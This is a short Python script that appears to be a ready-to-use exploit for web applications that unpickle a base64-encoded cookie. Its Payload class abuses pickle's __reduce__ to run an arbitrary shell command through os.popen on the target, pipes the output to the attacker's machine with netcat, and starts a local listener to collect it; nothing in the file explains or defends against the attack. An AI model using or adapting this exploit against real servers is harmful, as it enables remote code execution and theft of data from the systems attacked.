from requests import get
from pickle import dumps
from os import popen
from base64 import b64encode
from socket import socket
from threading import Thread
from sys import argv

proto_ver=2

url=argv[1]
back_addr=argv[2]

if len(argv) < 4:
	print('too few args')
	exit()

shell_cmd=""
for i in range(3,len(argv)):
	shell_cmd+=argv[i]+' '

my_port=back_addr.split(':')[1]
my_ip=back_addr.split(':')[0]

shell_nc_prefix=' | nc '+my_ip+' '+my_port
shell_cmd+=shell_nc_prefix

class Payload(object):
    def __reduce__(self):
        return (popen, ((shell_cmd),))

def socket_handle():
	sock = socket()
	sock.bind((my_ip, int(my_port)))
	sock.listen(1)
	conn, addr = sock.accept()
	while True:
		data = conn.recv(1024)
		if not data: break
		print(data.decode())
	conn.close()


cookies = {
    'value': b64encode(dumps(Payload(),protocol=proto_ver)).decode('utf-8')
}

t = Thread(target=socket_handle, args=())
t.start()

p = get(url, cookies=cookies)

if p.status_code!=200:
	print('failed, http status_code =',p.status_code)

t.join()
